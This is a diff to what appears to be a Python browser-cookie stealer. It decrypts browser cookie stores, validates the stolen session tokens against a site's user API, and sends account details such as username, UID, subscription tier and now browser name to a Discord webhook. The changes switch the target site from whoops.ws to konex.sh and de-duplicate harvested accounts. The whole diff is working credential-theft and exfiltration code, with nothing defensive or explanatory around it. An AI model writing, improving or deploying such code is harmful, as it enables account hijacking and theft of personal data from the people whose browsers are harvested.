@@ -18,16 +18,17 @@ import windows.generated_def as gdef
 from contextlib import contextmanager
 from Crypto.Cipher import AES, ChaCha20_Poly1305
 
-WEBHOOK_URL = "" # You webhook url here
+WEBHOOK_URL = "" # <- Your Discord Webhook URL here 
 
 VALID_COOKIES = []
+FOUND_USERNAMES = []
 
 HEADERS = {
     "accept": "*/*",
     "accept-encoding": "gzip, deflate, br, zstd",
     "accept-language": "fr-FR,fr;q=0.7",
     "priority": "u=1, i",
-    "referer": "https://whoops.ws/",
+    "referer": "https://konex.sh/",
     "sec-ch-ua": '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
     "sec-ch-ua-mobile": "?1",
     "sec-ch-ua-platform": '"Android"',
@@ -151,7 +152,7 @@ def is_valid_whoops_cookie(Value: str) -> tuple[bool, dict | None]:
         "__Secure-next-auth.session-token": Value
     }
     HEADERS["user-agent"] = random.choice(USER_AGENTS)
-    ApiURL = "https://whoops.ws/api/users/me"
+    ApiURL = "https://konex.sh/api/users/me"
 
     Resp = requests.get(ApiURL, headers=HEADERS, cookies=Cookies)
 
@@ -306,8 +307,6 @@ def process_browser(browser_name, browser_config):
                             continue
 
                     if is_whoops_cookie(name):
-                        if Value in VALID_COOKIES: continue
-
                         res = is_valid_whoops_cookie(Value)
 
                         if res[0]:
@@ -317,10 +316,14 @@ def process_browser(browser_name, browser_config):
                             username = datas.get("username")
                             userid = datas.get("id")
 
+                            if username in FOUND_USERNAMES: continue
+
+                            FOUND_USERNAMES.append(username)
+
                             avatar_relative_path = datas.get("avatar")
 
                             if avatar_relative_path != None:
-                                avatar_url = "https://whoops.ws" + avatar_relative_path
+                                avatar_url = "https://konex.sh" + avatar_relative_path
                             else:
                                 avatar_url = None
 
@@ -329,6 +332,7 @@ def process_browser(browser_name, browser_config):
                             plan = datas.get("subscription").get("tier")
 
                             output = {
+                                "browser": browser_name.capitalize(),
                                 "display_name": displayname,
                                 "username": username,
                                 "uid": userid,
@@ -377,6 +381,7 @@ def send_datas_to_webhook(webhook_url: str, datas: list[dict]) -> None:
             return "```" + text + "```"
         
     for account in datas:
+        browser_name = account.get("browser", "--")
         display_name = account.get("display_name", "--")
         username = account.get("username", "--")
         uid = account.get("uid", "--")
@@ -391,6 +396,7 @@ def send_datas_to_webhook(webhook_url: str, datas: list[dict]) -> None:
             "color": 0x2F3136,
             "thumbnail": {"url": avatar_url} if avatar_url else {},
             "fields": [
+                {"name": "Naviguateur", "value": format(browser_name), "inline": True},
                 {"name": "Nom d'affichage", "value": format(display_name), "inline": True},
                 {"name": "Username", "value": format(username), "inline": True},
                 {"name": "UID", "value": format(uid), "inline": False},
